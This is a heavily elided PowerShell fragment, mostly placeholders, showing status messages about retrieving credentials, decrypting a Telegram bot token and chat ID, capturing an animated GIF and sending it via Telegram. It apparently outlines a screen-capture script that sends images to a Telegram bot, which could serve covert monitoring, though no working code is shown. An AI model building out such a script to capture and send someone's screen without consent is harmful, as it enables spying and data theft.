...
try {
    ...
    Write-Output "Credentials retrieved successfully."
} catch {
...
Write-Output "Bot token and chat ID decrypted successfully."
...
function Capture-AnimatedGIF {
    ...
    $encoder.Save($fs)
    $fs.Close()
    Write-Output "GIF created successfully at $gifPath."
    return $gifPath
}
...
function Send-TelegramAnimation {
    ...
    try {
        ...
        $Response.Close()
        Write-Output "GIF sent successfully via Telegram."
    } catch {
